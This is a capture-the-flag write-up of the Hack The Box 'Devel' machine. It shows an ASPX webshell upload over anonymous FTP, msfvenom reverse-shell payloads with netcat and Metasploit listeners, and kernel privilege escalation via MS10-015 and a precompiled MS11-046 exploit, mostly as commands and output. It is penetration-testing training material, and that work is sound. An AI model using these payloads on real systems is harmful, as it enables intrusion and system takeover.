---
title: "Hack The Box: Devel"
date: 2026-07-25
ref: WU-003
summary: "Rooting the retired HTB 'Devel' machine — exploiting anonymous FTP write access to an IIS webroot to upload an ASPX webshell, gaining an initial foothold as a low-privileged IIS service account, and escalating to SYSTEM via a local kernel privilege escalation vulnerability on an unpatched Windows 7 build."
tags: [hack-the-box, ftp, iis, aspx, windows, metasploit, ms10-015, ms11-046, privilege-escalation]
---

# Devel — Hack The Box Write-up

## Description

**Devel** is an easy Windows machine on Hack The Box that introduces the concept of chaining a misconfigured service with a local privilege escalation to achieve full system compromise. The attack path involves exploiting anonymous FTP access to an IIS webroot to upload a malicious ASPX payload, gaining initial access as a low-privileged IIS service account, and then escalating privileges to SYSTEM using an unpatched local kernel vulnerability.

**Retired machine — `devel.htb`**

- **IP Address:** 10.129.36.65
- **Operating System:** Windows 7 Enterprise (Build 7600)
- **Architecture:** x86

**Credentials:**
FTP allows for Anonymous access.
```FTP
Anonymous:Anonymous
```

**Nmap**

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-25 16:26 EDT
Nmap scan report for 10.129.36.65
Host is up (0.024s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.68 seconds
```

**Quick Services:**

| Port | Service                 |
| ---- | ----------------------- |
| 21   | FTP (Anonymous allowed) |
| 80   | HTTP (IIS 7.5)          |

**Completion Status:**

- Root Flag: [Yes]
- User Flag: [Yes]
- Completion: [Complete] (100%)


---
### Enumeration

Let's first start by scanning the machine and see what ports are open. We can use our normal safe scripts `-sC` and versions `-sV` flags to give us some clues about what's running on the machine. This machine looks to only offer two ports and should be more straightforward to enumerate.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ nmap -sCV -oA Scans/Nmap-Service+Version 10.129.36.65

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd <-- Task 1
80/tcp open  http    Microsoft IIS httpd 7.5
```

We see both port 21 (FTP) and 80 (HTTP) open so we will need to investigate these ports ahead. We decide that based on our Nmap information we should first start with FTP as it looks to accept Anonymous access and it looks to have some possibly interesting files in that share.

---
### FTP (Port 21)

Our Nmap scans showed that the FTP share has files that we can access using the `Anonymous` user, we will start there and see if there is anything of particular interest. We can access the share using the `ftp` command and the box's IP address, we will then be prompted for a username and password which we use `Anonymous` for both.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ ftp 10.129.36.65
Connected to 10.129.36.65.
220 Microsoft FTP Service
Name (10.129.36.65:kali): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp>
```

Once connected we can then inspect the share's contents using the `dir` command, we see three interesting files that give us some important hints about where the share might be located and what kind of web service and file type architecture it might be using.
```Shell
ftp> dir
229 Entering Extended Passive Mode (|||49158|)
150 Opening ASCII mode data connection.
03-18-17  02:06AM       <DIR>          aspnet_client <-- ASP?
03-17-17  05:37PM                  689 iisstart.htm <-- IIS Homepage?
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> get iisstart.htm
local: iisstart.htm remote: iisstart.htm <-- Grab the Homepage
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; Transfer starting.
100% |************************************************************************************************************************************************|   689       29.41 KiB/s    00:00 ETA
226 Transfer complete.
689 bytes received in 00:00 (29.18 KiB/s)
```

When we inspect the contents of the `iisstart.htm` file we can see it's a landing page for IIS and could likely mean that the FTP share is located in the web root directory of the Devel machine. If this is the case we have some interesting options open to us ahead, but we should validate our findings with evidence first.
```HTML
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ cat iisstart.htm                                                                                                
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>IIS7</title>
<style type="text/css">
<!--
body {
        color:#000000;
        background-color:#B3B3B3;
        margin:0;
}

#container {
        margin-left:auto;
        margin-right:auto;
        text-align:center;
        }

a img {
        border:none;
}

-->
</style>
</head>
<body>
<div id="container">
<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="welcome.png" alt="IIS7" width="571" height="411" /></a>
</div>
</body>
</html> 
```

Given that we now have a suspicion of the FTP share being located in the web root folder, we should move on to port 80 and see what's being hosted at that location. If we confirm the presence of the files this will mean we can start to formulate an attack.

---

# HTTP (Port 80)

Inspecting the web service is straightforward — we load up Firefox and enter the machine's URL, in our case `http://10.129.36.65/`. Once loaded we get the expected result and see a default landing page for IIS.

![IIS default landing page]({{ '/assets/img/htb-devel/Devel_HTTP_IIS.png' | relative_url }})

This is a good start but does not alone confirm our findings. We will need to upload something via our Anonymous FTP access and then attempt to navigate to the resource. We create the following HTML file and call it `proof.html`, we can use this to validate our findings conclusively if we can upload and access it.

> **Good Methodology — Validate Before Exploiting**
>
> The `proof.html` upload step is worth pausing on. Before uploading a webshell or any executable payload, confirming write access with a benign HTML file is good practice. It proves the upload path works, confirms the FTP share maps to the webroot, and avoids the noise of a failed payload upload if basic assumptions turn out to be wrong. It costs thirty seconds and eliminates one variable from the troubleshooting stack if something goes wrong later.

``` HTML
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>HTB Devel - Proof of Upload</title>
<style>
body{
    font-family:Segoe UI,Arial,sans-serif;
    background:#f4f4f4;
    color:#333;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}
.box{
    background:white;
    padding:30px;
    border-radius:8px;
    box-shadow:0 2px 10px rgba(0,0,0,.15);
    text-align:center;
}
h1{color:#2e8b57;margin-top:0;}
</style>
</head>
<body>

<div class="box">
    <h1>✓ File Upload Successful</h1>
    <p>This page confirms write access to the IIS web root.</p>
    <p><strong>Target:</strong> Hack The Box - Devel</p>
    <p><strong>Timestamp:</strong> <script>document.write(new Date().toLocaleString());</script></p>
</div>
</body>
</html>
```

We upload the `proof.html` file using our FTP access from earlier, we use the `put` command to upload our test file and we can see if we can access it next.
```Shell
ftp> put proof.html <-- Task 2
local: proof.html remote: proof.html
229 Entering Extended Passive Mode (|||49160|)
125 Data connection already open; Transfer starting.
100% |************************************************************************************************************************************************|   827       26.28 MiB/s    --:-- ETA
226 Transfer complete.
827 bytes sent in 00:00 (33.24 KiB/s)
```

Navigating to `http://10.129.36.65/proof.html` we can see the file has successfully uploaded and we are able to access it, this confirms that the FTP share is in the web root directory and we formulate the idea that we might be able to get code execution on the machine.

![Proof of upload confirmation page rendered in Firefox]({{ '/assets/img/htb-devel/Devel_HTTP_Upload.png' | relative_url }})


> **Note — ASP and ASPX**
>
> When we accessed the FTP share earlier we noted the `aspnet_client` directory, which indicates the web server is likely running either `.asp` or `.aspx` files given that it is running IIS. Armed with our earlier Nmap scan showing `Microsoft-IIS/7.5` in the server banner, a quick search confirms that IIS 7.5 on Windows 7 supports both classic ASP and ASP.NET (ASPX). We will target ASPX as it is the more capable and modern of the two.


---

### ASPX WebShell

Given our above research, we are now in a position to attempt to run a webshell on the Devel machine, this will allow us to get Remote Code Execution (RCE) on the machine. We can start by locating a usable webshell on our Kali machine, we decide to use `.aspx` first and see if we have any success.

We start by using the `locate` command to look through our Kali machine for any `.aspx` files that fit our requirement, we find one at `/usr/share/webshells/aspx/cmdasp.aspx` and we decide to copy this to our working directory for ease of use.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ mkdir exploit

┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ cd exploit  

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
└─$ locate .aspx   
/home/kali/Documents/Hack The Box/Machines/Devel/exploit/shell.aspx
/home/kali/Documents/Hack The Box/Machines/Devel/exploit/shell2.aspx
/usr/share/davtest/backdoors/aspx_cmd.aspx
/usr/share/laudanum/aspx/shell.aspx
/usr/share/metasploit-framework/data/templates/scripts/to_exe.aspx.template
/usr/share/metasploit-framework/data/templates/scripts/to_mem.aspx.template
/usr/share/sqlmap/data/shell/backdoors/backdoor.aspx_
/usr/share/sqlmap/data/shell/stagers/stager.aspx_
/usr/share/webshells/aspx/cmdasp.aspx <--- We will use this one!

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
└─$ cp /usr/share/webshells/aspx/cmdasp.aspx shell.aspx
```

We then upload the newly copied webshell named `shell.aspx` to the machine using our FTP access as before with the `put` command.
```Shell
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49161|)
125 Data connection already open; Transfer starting.
100% |************************************************************************************************************************************************|  1442       32.74 MiB/s    --:-- ETA
226 Transfer complete.
1442 bytes sent in 00:00 (58.07 KiB/s)

```

Navigating to `http://10.129.36.65/shell.aspx` gives us access to our webshell and we are able to run the `whoami` command, this allows us to see we are executing in the context of the `iis apppool\web` user and that we will likely need to escalate privileges later on.

![Webshell whoami output showing iis apppool\web]({{ '/assets/img/htb-devel/Devel_WS_Whoami.png' | relative_url }})

Now we have confirmed RCE, we can start attempting to move the shell into an interactive session. We have multiple ways to do this which will be explored ahead. Before rushing to get a more interactive shell we should take a moment to enumerate the machine.

Running the `systeminfo` command gives us some very useful information, a breakdown of the findings is as follows:

1. There is a user on the machine called `babis`, possibly handy for locating the user flag later.
2. We have the OS name, version, and system type — from this we can confirm it is a Windows 7 32-bit machine running a very early version of the OS.
3. No hotfixes have been applied to the machine, which may mean it has never been updated — possibly a fresh install straight from the disc.

![systeminfo output from the webshell]({{ '/assets/img/htb-devel/Devel_WS_Sysinfo.png' | relative_url }})

> **The Smoking Gun — `Hotfix(s): N/A`**
>
> The most significant single line in the `systeminfo` output is `Hotfix(s): N/A`. This tells us the machine has never received a single Windows Update since installation. Combined with the OS version being Windows 7 Build 7600 — the original RTM (Release to Manufacturing) build from 2009 — this dramatically widens the attack surface. Any local privilege escalation vulnerability discovered in the years between Windows 7's release and the end of mainstream support is potentially exploitable here, which is exactly what the Windows Exploit Suggester output later reflects.

---

### Interactive Shells

We have now got multiple ways to get a more interactive shell on the machine, we can demonstrate two that will lead us into both automated and manual exploitation paths ahead. We can use the online [RevShells](https://www.revshells.com/) website by 0day to help us generate our payloads and associated listener commands quickly and effectively.


**Meterpreter Reverse Shell**

Let's start as we always do and go with the automated approach first. Once we get a callback from a Meterpreter shell we will have a wealth of options that the Metasploit framework offers and can be used to help us later on.

Using our [RevShells](https://www.revshells.com/) resource we can not only get an msfvenom command for creating our desired payload, but it also offers us the associated listener command ready for catching the callback once we deploy the shell to Devel. All we need to do is enter our local IP and port and ensure that we use a `.aspx` shell type. Remembering our `systeminfo` output from earlier we select the required 32-bit based version.

![RevShells meterpreter payload generation]({{ '/assets/img/htb-devel/Devel_IS_Meterpreter.png' | relative_url }})

Using the generated command from above, we create a Meterpreter shell and choose to name it `met.aspx` for ease of use, which allows us to remember the shell type at a glance.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.39 LPORT=443 -f aspx -o met.aspx    
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2873 bytes
Saved as: met.aspx
```

We then drop the file in the Devel machine's web root using our FTP access as before.
```Shell
ftp> put met.aspx
local: met.aspx remote: met.aspx
229 Entering Extended Passive Mode (|||49163|)
150 Opening ASCII mode data connection.
100% |************************************************************************************************************************************************|  2913       55.56 MiB/s    --:-- ETA
226 Transfer complete.
2913 bytes sent in 00:00 (118.54 KiB/s)
```

We can then navigate to `http://10.129.36.65/met.aspx` and this will execute the payload. We will be greeted with a callback from the machine and our Meterpreter handler drops us into a session. We can use this access in the next section where we automate our enumeration and escalate our privileges using the Metasploit framework.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
└─$ sudo msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.14.39; set lport 443; exploit"
[sudo] password for kali: 
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
lhost => 10.10.14.39
lport => 443
[*] Started reverse TCP handler on 10.10.14.39:443 
[*] Sending stage (188998 bytes) to 10.129.36.65
[*] Meterpreter session 1 opened (10.10.14.39:443 -> 10.129.36.65:49164) at 2026-07-26 12:43:48 -0400

meterpreter >
```

**PowerShell Reverse Shell**

We can now take a more manual approach to getting a shell. Using our [RevShells](https://www.revshells.com/) resource we decide to chain our webshell with a PowerShell payload and a netcat listener. This will land us a shell but we will need to take a more manual approach than leaning on the Metasploit framework to do all the heavy lifting for us.

The command is Base64 encoded before being executed via the webshell to improve reliability. Encoding helps avoid issues caused by special characters, spaces, quotes, and shell metacharacters that may otherwise be interpreted or modified by the web application, HTTP requests, or the underlying command interpreter. The command is decoded on the target immediately before execution, ensuring it is processed exactly as intended.

![RevShells PowerShell Base64 payload generation]({{ '/assets/img/htb-devel/Devel_IS_PowerShell.png' | relative_url }})

Next we set up a listener on our machine using `nc -lvnp 31337` and copy the PowerShell command over to our webshell. Once pasted and run we should get a connection back to our machine and have an interactive session.

![Webshell with PowerShell Base64 payload pasted and executed]({{ '/assets/img/htb-devel/Devel_IS_Webshell2PowerShell.png' | relative_url }})

We get a callback from the payload and now have a session on the machine. We will pick up from here again in the manual exploitation section ahead.
```Powershell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ nc -lvnp 31337
listening on [any] 31337 ...
connect to [10.10.14.39] from (UNKNOWN) [10.129.36.65] 49162

PS C:\windows\system32\inetsrv> hostname
devel
PS C:\windows\system32\inetsrv> ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection 4:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::98b:d20e:72f5:3c13
   Temporary IPv6 Address. . . . . . : dead:beef::1015:f515:bf19:79b
   Link-local IPv6 Address . . . . . : fe80::98b:d20e:72f5:3c13%15
   IPv4 Address. . . . . . . . . . . : 10.129.36.65
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:c01e%15
                                       10.129.0.1

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb
PS C:\windows\system32\inetsrv> whoami
iis apppool\web

```


> **Warning — Mislabelling Interactive**
>
> We later find that labelling this PowerShell session as interactive is a mistake. Its existence has been deliberately left here as a learning opportunity for both the writer and the reader — this could potentially save someone hours diagnosing an issue where certain commands and tools will not run due to still being inside a dumb shell.
>
> This will be addressed in the "Manual Privilege Escalation" section later.


---

### Automated Privilege Escalation

At this point we know we have landed as a low-privileged user and our access is limited. We will now need to find possible privilege escalation routes open to us. Luckily, whilst using Metasploit we can deploy the `local_exploit_suggester` post-recon module that will test for possible exploits we can use to move vertically.

We first background the active session, then we use the `search` function to look for the exploit suggester module. We are presented with two options and we are interested in the local exploit as we want to escalate privileges, not persist as a low-privilege account.
```Shell
meterpreter > bg
[*] Backgrounding session 1...
msf exploit(multi/handler) > search exploit suggester

Matching Modules
================

   #  Name Disclosure Date  Rank    Check  Description
   -  ---- ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  <-- task 3       normal  No     Multi Recon Local Exploit Suggester
   1  post/multi/recon/persistence_suggester    .                normal  No     Persistence Exploit Suggester


Interact with a module by name or index. For example info 1, use 1 or use post/multi/recon/persistence_suggester

msf exploit(multi/handler) > use 0
```

We drop in the exploit suggester module and use the `show options` command to see we only require one option — the session the module will run on. We can run `sessions -l` to see our previous shell is set as session ID 1 and select it accordingly.
```Shell
msf post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

msf post(multi/recon/local_exploit_suggester) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  1         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.39:443 -> 10.129.36.65:49164 (10.129.36.65)                                                                           
msf post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1 
```

We then run the module and wait a short while for it to complete.
```Shell
msf post(multi/recon/local_exploit_suggester) > run
[*] 10.129.36.65 - Collecting local exploits for x86/windows...
<-----------------------------SNIP-------------------------------->
[*] Running check method for exploit 42 / 42
[*] 10.129.36.65 - Valid modules for session 1: 
```

Once the module completes we can see a list of 42 results with 16 showing as potentially vulnerable. Given our earlier `systeminfo` output showing the box has never been updated, it is highly likely that the machine is vulnerable to all applicable candidates.

![Local exploit suggester results showing 16 potential vulnerabilities]({{ '/assets/img/htb-devel/Devel_APE_ExploitSuggest.png' | relative_url }})

For our purposes we choose to use the `exploit/windows/local/ms10_015_kitrap0d` module as we are going to explore this exploit in much more depth in the "Beyond Root" section.

> **MS10-015 (KiTrap0D)**
>
> MS10-015 is a local privilege escalation vulnerability in the Windows kernel that allows a local user to elevate privileges to **NT AUTHORITY\SYSTEM** by exploiting improper handling of kernel exceptions in the Virtual DOS Machine (VDM) subsystem.
>
> The exploit gets its name, *KiTrap0D*, from the Windows kernel function responsible for handling General Protection Fault (#GP) exceptions — exception vector 0xD (decimal 13) — which the vulnerability abuses to gain SYSTEM privileges.

We select the module and see that it requires some options of its own. We use the `show options` command and see it not only requires a session parameter but also a local host for the new payload. We use the `setg` command to set the local host to our tun0 address globally, meaning this will be the default if we need to change modules again.
```Shell
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/local/ms10_015_kitrap0d) > show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.243.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)



View the full module info with the info, or info -d command.

msf exploit(windows/local/ms10_015_kitrap0d) > setg LHOST 10.10.14.39
LHOST => 10.10.14.39
msf exploit(windows/local/ms10_015_kitrap0d) > set SESSION 1
SESSION => 1
```

Running the exploit works and we drop into a new session as `nt authority\system`, executing commands in a high-integrity context.
```Shell
msf exploit(windows/local/ms10_015_kitrap0d) > run
[*] Started reverse TCP handler on 10.10.14.39:4444 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching msiexec to host the DLL...
[+] Process 2904 launched.
[*] Reflectively injecting the DLL into 2904...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (188998 bytes) to 10.129.36.65
[*] Meterpreter session 2 opened (10.10.14.39:4444 -> 10.129.36.65:49165) at 2026-07-26 13:23:15 -0400

meterpreter > shell
Process 2624 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system
```


---

### Manual Privilege Escalation

With only our PowerShell session we will now need to employ more manual enumeration techniques to discover how to escalate our privileges. The only information we are armed with at this point is the result of the previously run `systeminfo`, which showed the machine is an older version with no hotfixes and creates a much wider attack surface.

At the time of writing, a lot of tools were outdated or no longer worked — Watson, for example, is now version 2.0 and is not built for such an old system. After some research we discover [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng), which is perfect for our purposes as it only requires the output of a `systeminfo` command that we already have.

We start by downloading the tool into our working directory, moving into it, and then placing the output of a `systeminfo` command from the Devel machine into a text file in that directory.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ git clone https://github.com/bitsadmin/wesng.git

Cloning into 'wesng'...
remote: Enumerating objects: 1571, done.
remote: Counting objects: 100% (44/44), done.
remote: Compressing objects: 100% (40/40), done.
remote: Total 1571 (delta 8), reused 11 (delta 4), pack-reused 1527 (from 4)
Receiving objects: 100% (1571/1571), 316.06 MiB | 32.82 MiB/s, done.
Resolving deltas: (903/903), done.

┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ cd wesng

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/wesng]
└─$ cat systeminfo.txt 
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ??
System Boot Time:          27/7/2026, 4:30:08 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.439 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.502 MB
Virtual Memory: In Use:    639 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.36.65
                                 [02]: fe80::a843:726:aad7:a733
                                 [03]: dead:beef::a185:4222:efa5:99ee
                                 [04]: dead:beef::a843:726:aad7:a733
 
```


We will first need to update the tool to get the required definitions.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/wesng]
└─$ python3 wes.py --update
Windows Exploit Suggester 1.06 ( https://github.com/bitsadmin/wesng/ )
[+] Updating definitions
[+] Obtained definitions created at 20260716 
```

We then run the tool and it produces a large list of known vulnerabilities. The output has been edited for brevity to show only the two exploits we will focus on in this walkthrough.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/wesng]
└─$ python3 wes.py systeminfo.txt --impact "Elevation of Privilege"
Windows Exploit Suggester 1.06 ( https://github.com/bitsadmin/wesng/ )
[+] Parsing systeminfo output
[+] Operating System
    - Name: Windows 7 for 32-bit Systems
    - Generation: 7
    - Build: 7600
    - Version: None
    - Architecture: 32-bit
    - Installed hotfixes: None
[+] Loading definitions
    - Creation date of definitions: 20260716
[+] Determining missing patches
[+] Applying display filters
[!] Found vulnerabilities!                                                                                                                                            Date: 20100209                                             
CVE: CVE-2010-0233                                         
KB: KB977165                                               
Title: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege
Affected product: Windows 7 for 32-bit Systems             
Affected component:                                        
Severity: Important                                        
Impact: Elevation of Privilege                             
Exploit: https://exploit-db.com/exploits/33593                                                                        
Date: 20110614
CVE: CVE-2011-1249
KB: KB2503665
Title: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege
Affected product: Windows 7 for 32-bit Systems
Affected component:
Severity: Important
Impact: Elevation of Privilege
Exploits: https://exploit-db.com/exploits/18755, https://exploit-db.com/exploits/40564   

[-] Missing patches: 23                                    
    - KB2840149: patches 4 vulnerabilities                 
    - KB2808735: patches 4 vulnerabilities                 
    - KB2742598: patches 4 vulnerabilities                 
    - KB2756920: patches 4 vulnerabilities                 
    - KB2742595: patches 4 vulnerabilities                 
    - KB2807986: patches 3 vulnerabilities                 
    - KB2656351: patches 3 vulnerabilities                 
    - KB2656355: patches 3 vulnerabilities                 
    - KB2813170: patches 2 vulnerabilities                 
    - KB2425227: patches 2 vulnerabilities                 
    - KB2393802: patches 2 vulnerabilities                 
    - KB982799: patches 2 vulnerabilities                  
    - KB977165: patches 2 vulnerabilities                  
    - KB2790113: patches 1 vulnerability                   
    - KB2789644: patches 1 vulnerability                   
    - KB2789642: patches 1 vulnerability                   
    - KB2778930: patches 1 vulnerability                   
    - KB2690533: patches 1 vulnerability                   
    - KB2633171: patches 1 vulnerability                   
    - KB2620712: patches 1 vulnerability                   
    - KB2503665: patches 1 vulnerability                   
    - KB2442962: patches 1 vulnerability                   
    - KB2305420: patches 1 vulnerability                   
[I] KB with the most recent release date                   
    - ID: KB2840149                                        
    - Release date: 20130409                               
[+] Done. Displaying 49 of the 236 vulnerabilities found.      
```


As seen in the above output there are 49 possible exploits, but we choose to select two. One is the KiTrap0D exploit we have already used with Metasploit. The other we can source a precompiled exploit for and run manually. We will look at both in more depth in the "Beyond Root" section.

| Exploit                 | CVE               | Description                                                             |
| ----------------------- | ----------------- | ----------------------------------------------------------------------- |
| **MS10-015 (KiTrap0D)** | **CVE-2010-0233** | Windows Kernel General Protection Fault local privilege escalation.     |
| **MS11-046 (AFD.sys)**  | **CVE-2011-1249** | Windows Ancillary Function Driver (AFD.sys) local privilege escalation. |

We make use of abatchy17's GitHub repository called [WindowsExploits](https://github.com/abatchy17/WindowsExploits) as it contains a precompiled version of MS11-046, allowing us to streamline the process. We download the exploit and fire up an SMB share to allow us to run the executable remotely.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
└─$ ls
met.aspx  MS11-046.exe  shell.aspx

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
└─$ impacket-smbserver kali .
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0

┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
└─$ nc -lvnp 31337
listening on [any] 31337 ...
connect to [10.10.14.39] from (UNKNOWN) [10.129.36.65] 49161

PS C:\windows\system32\inetsrv> \\10.10.14.39\kali\MS11-046.exe

c:\Windows\System32>[*] MS11-046 (CVE-2011-1249) x86 exploit
   [*] by Tomislav Paskalev
[*] Identifying OS
   [+] 32-bit
   [+] Windows 7
[*] Locating required OS components
   [+] ntkrnlpa.exe
      [*] Address:      0x82818000
      [*] Offset:       0x008b0000
      [+] HalDispatchTable
         [*] Offset:    0x009d93b8
   [+] NtQueryIntervalProfile
      [*] Address:      0x76fe5510
   [+] ZwDeviceIoControlFile
      [*] Address:      0x76fe4ca0
[*] Setting up exploitation prerequisite
   [*] Initialising Winsock DLL
      [+] Done
      [*] Creating socket
         [+] Done
         [*] Connecting to closed port
            [+] Done
[*] Creating token stealing shellcode
   [*] Shellcode assembled
   [*] Allocating memory
      [+] Address:      0x02070000
      [*] Shellcode copied
[*] Exploiting vulnerability
   [*] Sending AFD socket connect request
      [+] Done
      [*] Elevating privileges to SYSTEM
         [+] Done
         [*] Spawning shell

[*] Exiting SYSTEM shell
PS C:\windows\system32\inetsrv> 
```

We see the exploit complete but it kicks us back to the original session. This is where we come to realise that the shell we are using is not as interactive as we thought.

> **Lessons Learned — Why the Exploit Exited Immediately**
>
> The MS11-046 exploit achieves privilege escalation by stealing the SYSTEM token and then spawning a new `cmd.exe` process running in that elevated context. When called from a PowerShell session that itself was spawned by a webshell, there is no allocated console or PTY (pseudo-terminal) for the new elevated process to attach to. The SYSTEM-level `cmd.exe` spawns, finds no interactive terminal to bind to, and exits immediately — dropping back to the original low-privileged session as if nothing happened.
>
> This is a symptom of the shell chain: **webshell → PowerShell → exploit**. Each link in that chain is non-interactive. The PowerShell session we labelled as "interactive" earlier is technically a dumb shell — it can run commands but cannot host child processes that require a console context to persist in. The solution is a properly interactive reverse shell (the `shell.exe` generated by msfvenom below) which allocates a real console that the spawned SYSTEM process can attach to and remain open in.

We can fix the issue by generating a new reverse shell using `msfvenom`. This will allow us to avoid any future issues running executables or tools that do not work correctly.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Devel/exploit]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.39 LPORT=4443 -f exe -o shell.exe
```

From our PowerShell session spawned from the webshell, we remotely call the newly generated `shell.exe` and get a callback from a truly interactive session.
```PowerShell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Devel]
└─$ nc -lvnp 31337
listening on [any] 31337 ...
